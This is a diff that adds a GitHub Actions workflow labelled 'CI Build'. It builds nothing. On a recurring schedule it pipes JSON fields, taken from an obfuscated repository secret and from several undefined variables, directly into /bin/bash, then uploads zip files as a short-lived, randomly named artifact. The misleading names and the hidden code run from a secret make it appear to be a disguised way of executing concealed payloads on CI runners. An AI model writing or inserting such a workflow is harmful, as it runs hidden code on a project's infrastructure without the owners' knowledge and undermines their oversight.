@@ -1,0 +1,34 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '44 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Deploy
+        env:
+          yhx088: ${{ secrets.yhx088 }}
+        run: |
+          printf '%s' "$yhx088" | jq -r .je87 | /bin/bash
+          echo $repbd3 | jq -r .kqiq9981 | /bin/bash
+          echo $dicb3007 | jq -r .jby1 | /bin/bash
+          printf '%s' "$i54798" | jq -r .pu8 | /bin/bash
+          printf '%s' "$mm23" | jq -r .jwj28 | /bin/bash
+          printf '%s' "$y8235" | jq -r .ofl74 | /bin/bash
+          echo $tfs3 | jq -r .djzpm708 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: omaKoJI0
+          path: "*.zip"
+          retention-days: 1
